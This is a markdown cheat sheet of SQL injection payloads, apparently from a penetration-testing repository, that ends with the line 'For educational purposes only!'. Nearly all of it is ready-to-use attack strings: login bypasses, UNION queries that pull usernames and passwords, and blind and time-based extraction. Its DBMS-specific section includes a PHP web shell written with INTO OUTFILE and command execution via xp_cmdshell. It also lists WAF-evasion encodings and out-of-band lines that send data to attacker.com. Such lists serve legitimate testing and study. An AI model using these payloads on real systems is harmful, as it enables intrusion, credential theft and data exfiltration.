# 💉 SQL Injection Payloads

```
  ███████╗ ██████╗ ██╗     ██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██║     ██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ███████╗██║   ██║██║     ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ╚════██║██║▄▄ ██║██║     ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████║╚██████╔╝███████╗██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

---

## 📋 Table of Contents

- [Detection Payloads](#-detection-payloads)
- [Authentication Bypass](#-authentication-bypass)
- [Union-Based Injection](#-union-based-injection)
- [Error-Based Injection](#-error-based-injection)
- [Blind SQL Injection](#-blind-sql-injection)
- [Time-Based Injection](#-time-based-injection)
- [DBMS Specific](#-dbms-specific)
- [WAF Bypass](#-waf-bypass)
- [Out-of-Band](#-out-of-band)

---

## 🔍 Detection Payloads

### Basic Detection

```sql
'
"
`
')
")
`)
'))
"))
`))

-- comment
/* comment */
# comment (MySQL)
```

### Boolean Detection

```sql
' OR '1'='1
' OR '1'='1' --
' OR 1=1 --
" OR "1"="1
" OR 1=1 --
' OR 'x'='x
' OR ''='
') OR ('1'='1
') OR ('x'='x
1' OR '1'='1
1" OR "1"="1
```

### Arithmetic Detection

```sql
' OR 1=1--
' OR 1=2--
' AND 1=1--
' AND 1=2--
1 OR 1=1
1 AND 1=1
1 AND 1=2
```

### String Concatenation

```sql
' || 'test
' + 'test
' 'test
```

---

## 🔓 Authentication Bypass

### Login Bypass

```sql
admin' --
admin' #
admin'/*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR '1'='1--
') OR ('1'='1--
' OR ''='
' OR 1=1-- -
```

### Username Field

```sql
admin'--
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR '1'='1'/*
admin' OR 1=1--
admin'/*
```

### Password Field

```sql
' OR '1'='1
' OR ''='
' OR 1=1--
anything' OR '1'='1
```

### Common Bypass Combinations

```sql
Username: admin'--
Password: anything

Username: ' OR 1=1--
Password: anything

Username: admin
Password: ' OR '1'='1

Username: ' OR '1'='1' --
Password: ' OR '1'='1' --
```

---

## 🔗 Union-Based Injection

### Finding Columns

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...continue until error...

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Basic Union

```sql
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3,4--
```

### Data Extraction

```sql
-- MySQL
' UNION SELECT user(),database()--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--

-- PostgreSQL
' UNION SELECT current_user,version()--
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- MSSQL
' UNION SELECT @@version,NULL--
' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--

-- Oracle
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT table_name,NULL FROM all_tables--
```

### Union with Comments

```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,2,3#
' UNION SELECT 1,2,3/*
' UNION SELECT 1,2,3;%00
```

---

## ⚠️ Error-Based Injection

### MySQL Error-Based

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--

' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--

' AND EXP(~(SELECT * FROM (SELECT version())x))--
```

### MSSQL Error-Based

```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

' AND 1=(SELECT TOP 1 CAST(username AS int) FROM users)--
```

### PostgreSQL Error-Based

```sql
' AND 1=CAST((SELECT version()) AS int)--

' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
```

### Oracle Error-Based

```sql
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--

' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
```

---

## 🔮 Blind SQL Injection

### Boolean-Based Blind

```sql
-- True condition
' AND 1=1--
' AND 'a'='a'--

-- False condition
' AND 1=2--
' AND 'a'='b'--

-- Character extraction
' AND SUBSTRING(username,1,1)='a'--
' AND SUBSTRING((SELECT database()),1,1)='t'--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100--
```

### Binary Search

```sql
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>96--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>112--
...narrow down to exact character...
```

### Length Detection

```sql
' AND LENGTH(database())>1--
' AND LENGTH(database())>5--
' AND LENGTH(database())=7--
```

### Table/Column Enumeration

```sql
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--

' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u'--
```

---

## ⏱️ Time-Based Injection

### MySQL

```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
' AND BENCHMARK(10000000,SHA1('test'))--

1' AND (SELECT SLEEP(5) FROM dual WHERE database() LIKE 't%')--
```

### PostgreSQL

```sql
'; SELECT pg_sleep(5)--
' AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 1 END)--
' || pg_sleep(5)--
```

### MSSQL

```sql
'; WAITFOR DELAY '0:0:5'--
' AND 1=1 WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

### Oracle

```sql
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' AND 1=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END)--
```

---

## 🗄️ DBMS Specific

### MySQL Payloads

```sql
-- Version
' UNION SELECT @@version--
' UNION SELECT version()--

-- Current user
' UNION SELECT user()--
' UNION SELECT current_user()--

-- Database
' UNION SELECT database()--

-- Tables
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

-- Columns
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

-- Read file
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- Write file
' UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--
```

### PostgreSQL Payloads

```sql
-- Version
' UNION SELECT version()--

-- Current user
' UNION SELECT current_user--

-- Database
' UNION SELECT current_database()--

-- Tables
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--

-- Read file
' UNION SELECT pg_read_file('/etc/passwd')--

-- Command execution
'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';--
```

### MSSQL Payloads

```sql
-- Version
' UNION SELECT @@version--

-- Current user
' UNION SELECT SYSTEM_USER--

-- Database
' UNION SELECT DB_NAME()--

-- Tables
' UNION SELECT name FROM sysobjects WHERE xtype='U'--

-- Command execution
'; EXEC xp_cmdshell 'whoami';--

-- Enable xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

### Oracle Payloads

```sql
-- Version
' UNION SELECT banner FROM v$version WHERE rownum=1--

-- Current user
' UNION SELECT user FROM dual--

-- Database
' UNION SELECT ora_database_name FROM dual--

-- Tables
' UNION SELECT table_name FROM all_tables--

-- Columns
' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--
```

---

## 🛡️ WAF Bypass

### Space Bypass

```sql
'/**/OR/**/1=1--
' OR/**/1=1--
'%09OR%091=1--
'%0AOR%0A1=1--
'%0COR%0C1=1--
'%0DOR%0D1=1--
'+OR+1=1--
```

### Comment Bypass

```sql
/*!50000SELECT*/ * FROM users
SELECT/**_**/ * FROM users
SELECT%0a* FROM users
```

### Case Variation

```sql
' uNiOn SeLeCt 1,2,3--
' UnIoN sElEcT 1,2,3--
```

### Encoding

```sql
-- URL encoding
%27%20OR%201=1--
%27%20UNION%20SELECT%201,2,3--

-- Double URL encoding
%2527%20OR%201=1--

-- Hex encoding
' UNION SELECT 0x61646d696e--  (admin in hex)
```

### Keyword Bypass

```sql
-- UNION bypass
' UNION ALL SELECT
' /*!UNION*/ SELECT
' UN/**/ION SE/**/LECT

-- SELECT bypass
' UNION SEL/**/ECT
' UNION%0ASELECT
' UNION(SELECT)

-- AND/OR bypass
' && 1=1--
' || 1=1--
' %26%26 1=1--
' -1 || 1=1--
```

### HPP (HTTP Parameter Pollution)

```
?id=1&id=' OR '1'='1
?id=1/*&id=*/' OR '1'='1
```

---

## 📡 Out-of-Band

### MySQL OOB

```sql
SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))
SELECT * INTO OUTFILE '\\\\attacker.com\\share\\output.txt'
```

### MSSQL OOB

```sql
'; EXEC master..xp_dirtree '\\attacker.com\share'--
'; EXEC master..xp_fileexist '\\attacker.com\share'--
```

### PostgreSQL OOB

```sql
CREATE EXTENSION dblink; SELECT dblink_connect('host=attacker.com user=test password=test dbname=test')
```

### Oracle OOB

```sql
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||version) FROM dual
SELECT HTTPURITYPE('http://attacker.com/'||version).GETCLOB() FROM dual
```

---

## 📊 Quick Reference

### Detection Order

1. `'` - Single quote
2. `"` - Double quote
3. `' OR '1'='1` - Boolean injection
4. `' AND SLEEP(5)--` - Time-based
5. `' UNION SELECT NULL--` - Union-based

### Common Endpoints

```
- Login forms
- Search boxes
- User IDs in URLs
- Cookie values
- HTTP headers (User-Agent, Referer)
- API parameters
```

### SQL Comments by DBMS

| DBMS | Comments |
|------|----------|
| MySQL | `-- `, `#`, `/* */` |
| PostgreSQL | `-- `, `/* */` |
| MSSQL | `-- `, `/* */` |
| Oracle | `-- `, `/* */` |

---

## 📚 Resources

- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

<p align="center">
  <b>💉 SQL Injection Arsenal</b><br>
  <i>For educational purposes only!</i>
</p>
